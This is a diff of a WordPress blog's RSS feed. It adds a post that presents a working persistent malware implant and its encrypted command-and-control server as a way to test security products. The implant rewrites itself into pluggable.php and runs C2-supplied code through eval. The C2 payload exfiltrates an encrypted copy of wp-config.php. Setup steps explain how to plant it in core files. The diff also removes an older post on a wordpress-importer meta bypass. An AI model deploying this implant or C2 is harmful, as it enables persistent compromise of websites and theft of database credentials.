@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Tue, 11 Aug 2020 10:52:16 +0000</lastBuildDate>
+	<lastBuildDate>Mon, 24 Aug 2020 03:12:25 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,225 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.4.2</generator>
 	<item>
+		<title>WordPress security testing</title>
+		<link>https://wpdeeply.com/wordpress-security-testing/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Mon, 24 Aug 2020 03:09:33 +0000</pubDate>
+				<category><![CDATA[redteam]]></category>
+		<category><![CDATA[0day]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=209</guid>
+
+					<description><![CDATA[There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you can&#8217;t verify all of the claims and if you try, you will need to waste huge load of time auditing / testing. That is why the goal of this section is to provide tools and methods for easy verification of those claims and to help users into choosing the right offering. </p>
+
+
+
+<h2>Attack demo</h2>
+
+
+
+<p>For the purpose of testing two scripts are created: malware/implant and remote C2 server script. Both are extremely easy for setup, but default versions are prepared in that way, so their abuse would require modifications. </p>
+
+
+
+<h5>malware</h5>
+
+
+
+<p>This software is based on <a rel="noreferrer noopener" href="https://github.com/Slavco/wp-weaver" target="_blank">wp-weaver</a> project, includes encryption in order to hide its actions and is more than modular to accept and execute everything that is sent by C2. </p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">//marker_weaver_ftw
+$target_files = array(
+    ABSPATH . WPINC . '/pluggable.php'
+    //just for demo purposes, that is why too few :)
+);
+
+//must be here because collisions of the rand and race conditions
+if ( ! function_exists("weaver_plant_payload") ){
+    function weaver_plant_payload($file, $payload_data, $append){
+        //grab the session for one peer only - payload almost forever in memory
+        if ( isset($_REQUEST["peer"]) &amp;&amp; $_REQUEST["peer"]!="" ) sleep(9);
+        if ( $append ){
+            @file_put_contents($file, $payload_data, FILE_APPEND | LOCK_EX);
+        }else{
+            @file_put_contents($file, $payload_data, LOCK_EX);
+        }
+        //time window to switch "session" towards another peer
+        if ( isset($_REQUEST["peer"]) &amp;&amp; $_REQUEST["peer"]!="" ) sleep(2);
+    }
+    $the_file = $target_files[rand(0,(sizeof($target_files)-1))];
+    $my_content = @file_get_contents(__FILE__);
+    $my_content_list = @explode("//\x6Darker_weaver_ftw", $my_content);
+    if ( is_array($my_content_list) &amp;&amp; sizeof($my_content_list) >= 2 ){
+        @file_put_contents(__FILE__, $my_content_list[0]);
+        @register_shutdown_function("weaver_plant_payload", $the_file, "//\x6Darker_weaver_ftw".$my_content_list[1], true);
+    }else{
+        //shouldn't be here, but at least don't damage the instance
+        @register_shutdown_function("weaver_plant_payload", __FILE__, $my_content, false);
+    }
+}
+//malware code below - any length, any logic
+if ( isset($_REQUEST["wpdeeply"])){
+    //choose the code execution method
+    $method_exec = 'eval';
+    $test_pass = FALSE;
+    
+    //test if execution mechanism works
+    if ( $method_exec ){
+        switch( $method_exec ){
+            case 'eval':
+                $test_data = '$find_me = array("find_me");';
+                eval($test_data);
+                if (isset($find_me) &amp;&amp; is_array($find_me) &amp;&amp; in_array('find_me', $find_me)) $test_pass = TRUE;
+                break;
+                //...
+        }
+        //if works then load instructions from c2
+        if ( $test_pass ){
+            
+	    	//hardcoded values put here during delivery of the test malware
+            define('C2_URL', 'https://local.host/c2.php');
+            $c2_box_publickey = base64_decode('CCp/4qGswYmd47p4heS8kwnC3z++VwGN7fRLOCi5sn0=');
+            
+            //encryption key for delivered payload
+            $session_key = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_KEYBYTES);
+            
+            //prepare data for c2 instruction
+            $json_requirements = json_encode(array(
+                'key'   => base64_encode($session_key),
+                'type' => 'eval'
+            ));
+            
+            //encrypt with c2 pub key
+            $rcr = \Sodium\crypto_box_seal(
+                $json_requirements,
+                $c2_box_publickey
+                );
+            
+            //get results
+            $c2_remote_fetch = wp_remote_post(
+                C2_URL,
+                array(
+                    'body' => array(
+                        'rcr'   => $rcr
+                    ),
+                )
+                );
+            //veryfy response
+            if ( ! is_wp_error( $c2_remote_fetch ) ) {
+                $c2_remote = json_decode( wp_remote_retrieve_body( $c2_remote_fetch ), true );
+            }
+            //verify response data format and execute commands
+            if ( is_array( $c2_remote ) &amp;&amp; isset( $c2_remote['payload'] ) &amp;&amp; isset( $c2_remote['nonce'] ) ) {
+                
+                $payload_encrypted = base64_decode( $c2_remote['payload'] );
+                $nonce = base64_decode( $c2_remote['nonce'] );
+                
+                //decrypt final payload from c2
+                $payload = \Sodium\crypto_secretbox_open($payload_encrypted, $nonce, $session_key);
+                if ( $payload !== false ){
+                    @eval($payload);
+                }
+            }
+        }
+    }
+}</code></pre>
+
+
+
+<h5>C2</h5>
+
+
+
+<p>This is simple server side script, that will serve the payload when requested by its malware and will log its actions in order to harvest the fruits of commands execution.</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">&lt;?php
+include 'sodium_compat/autoload.php';
+
+//handle the requests from the client/s
+if ( isset($_POST["rcr"]) ){
+    $encrypted_remote_client_requirements = $_POST["rcr"];
+}else{
+    exit(0);
+}
+
+//simple payload code with arrogant exfiltration method, but possible only for users with upload permissions :) 
+$remote_cmd = '
+    if ( defined("ABSPATH") ){
+        if ( file_exists(ABSPATH."wp-config.php") ){
+            wp_upload_bits("wpdeeply.jpg", "", \Sodium\crypto_box_seal(file_get_contents(ABSPATH."wp-config.php"), $c2_box_publickey));
+        }
+    }
+';
+
+
+//c2 public and secret keys
+$c2_box_secretkey = base64_decode('Gr10jP1z0VTyRtaJIav8ElMcmvQ6abfnkfKz5wftI+c=');
+$c2_box_publickey = base64_decode('CCp/4qGswYmd47p4heS8kwnC3z++VwGN7fRLOCi5sn0=');
+
+$c2_box_kp = \Sodium\crypto_box_keypair_from_secretkey_and_publickey(
+    $c2_box_secretkey,
+    $c2_box_publickey
+    );
+
+//decode the data received from client
+$remote_client_requirements = \Sodium\crypto_box_seal_open(
+    $encrypted_remote_client_requirements,
+    $c2_box_kp
+    );
+
+$remote_client_requirements = @json_decode($remote_client_requirements, true);
+if ( !$remote_client_requirements ) exit(0);
+
+//reply to the client with payload encrypted with delivered session_key + used nonce 
+if ( is_array($remote_client_requirements) &amp;&amp; isset($remote_client_requirements['key']) &amp;&amp; isset($remote_client_requirements['type']) ){
+    $session_key = base64_decode($remote_client_requirements['key']);
+    $session_nonce = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_NONCEBYTES);
+    $response = json_encode(array( 'payload' => base64_encode(\Sodium\crypto_secretbox($remote_cmd, $session_nonce, $session_key)), 'nonce'=> base64_encode($session_nonce)));
+    //add some fancy logging in order to know the client and type+format of exfiltrated data 
+    echo $response;
+}
+exit();</code></pre>
+
+
+
+<h5>Setup</h5>
+
+
+
+<p>In order to run the demo on your own WP instance you will need the following:</p>
+
+
+
+<ul><li>You will need to be logged in as user with upload permissions on the WP (it is this way in order to be stopped abuse of the scripts and that is why in the payload is used <span class="has-inline-color has-primary-color"><strong>wp_upload_bits</strong></span> function)</li><li>In the malware script set up your own value for <span class="has-inline-color has-primary-color"><strong>C2_URL</strong></span> constant and that is the url of your C2 script</li><li>In order to work C2 script you will need <strong>sodium_compat</strong> next to it and it could be found into any WP 5+ distribution under wp-includes folder</li><li>cat malware.txt > /path_to_your_code/wp-includes/pluggable.php</li><li>Logged in with user with upload permissions hit refresh on your WP homepage with <strong>?wpdeeply=ok</strong> parameters and check in the upload directory <strong>wpdeeply?-x.jpg</strong> with encrypted <strong>wp-config.php</strong> content </li></ul>
+
+
+
+<h2>Successful demo</h2>
+
+
+
+<p>This means that you managed to put malware on your WP and to execute code in it. For tech people it is clear (try to use peer method of the weaver) what is done in the background, but for not tech savvy users won&#8217;t be, but both are more than free to question its security guarantee about the events. Questions that would be good to be answered:</p>
+
+
+
+<ul><li>Why malware doesn&#8217;t disappear after update / re-install from admin screen or wpcli?</li><li>What type of commands &#8220;attacker&#8221; executed against WP?</li><li>What data was leaked and where?   </li><li>&#8230; </li></ul>
+
+
+
+<p></p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>WordPress protected meta via wp job manager</title>
 		<link>https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/</link>
 		
@@ -965,81 +1184,6 @@ if ( isset($_REQUEST["wppply"])){
 
 
 <ul><li>Turn off auto-updates and don&#8217;t use update / re-install WP options in the name of security</li><li>Server executable files shouldn&#8217;t be writable for server</li></ul>
-]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>WordPress importer and attached file</title>
-		<link>https://wpdeeply.com/wordpress-importer-and-attached-file/</link>
-		
-		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Fri, 17 Jul 2020 19:38:25 +0000</pubDate>
-				<category><![CDATA[core]]></category>
-		<category><![CDATA[plugins]]></category>
-		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=146</guid>
-
-					<description><![CDATA[WordPress project have put a lot of effort to prevent meddling with&#160;_wp_attached_file&#160;meta value. Part of this effort was put into wordpress-importer plugin as part of the core, but&#8230; Few versions back there was possibility to bypass those restrictions with&#160;\&#160;WP &#8220;magic&#8221;, but there are few more techniques. Eli5 PoC class-wp-import.php&#160;method&#160;is_valid_meta_key&#160;we have the following: and Do you [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<hr class="wp-block-separator"/>
-
-
-
-<p>WordPress project have put a lot of effort to prevent meddling with&nbsp;<code>_wp_attached_file</code>&nbsp;meta value. Part of this effort was put into wordpress-importer plugin as part of the core, but&#8230; Few versions back there was possibility to bypass those restrictions with&nbsp;<code>\</code>&nbsp;WP &#8220;magic&#8221;, but there are few more techniques.</p>
-
-
-
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-protected-meta.md#eli5-poc"></a>Eli5 PoC</h2>
-
-
-
-<p><code>class-wp-import.php</code>&nbsp;method&nbsp;<code>is_valid_meta_key</code>&nbsp;we have the following:</p>
-
-
-
-<pre class="wp-block-code"><code lang="php" class="language-php">function is_valid_meta_key( $key ) {
-		// skip attachment metadata since we'll regenerate it from scratch
-		// skip _edit_lock as not relevant for import
-		if ( in_array( $key, array( '_wp_attached_file', '_wp_attachment_metadata', '_edit_lock' ) ) )
-			return false;
-		return $key;
-	}
-</code></pre>
-
-
-
-<p>and</p>
-
-
-
-<pre class="wp-block-code"><code lang="php" class="language-php">add_filter( 'import_post_meta_key', array( $this, 'is_valid_meta_key' ) );
-</code></pre>
-
-
-
-<p>Do you see&nbsp;<code>_wp_attachment_backup_sizes</code>&nbsp;blocked in the code? <a href="https://wpdeeply.com/wordpress-attached-file-meta/" target="_blank" rel="noreferrer noopener">Why is that important?</a></p>
-
-
-
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-protected-meta.md#few-facts"></a>Few facts</h2>
-
-
-
-<ul><li>There are reliable attacks against export-import process from low privileged accounts</li></ul>
-
-
-
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-protected-meta.md#remediation"></a>Remediation</h2>
-
-
-
-<ul><li>Don&#8217;t allow wordpress-importer to fall back on the&nbsp;<code>class WXR_Parser_Regex</code></li><li>Do not assign <strong>import</strong> user capabilities on WP related projects </li><li>Add &nbsp;<code>_wp_attachment_backup_sizes</code> in the blocked list in the wordpress-importer code</li></ul>
-
-
-
-<p></p>
 ]]></content:encoded>
 					
 		
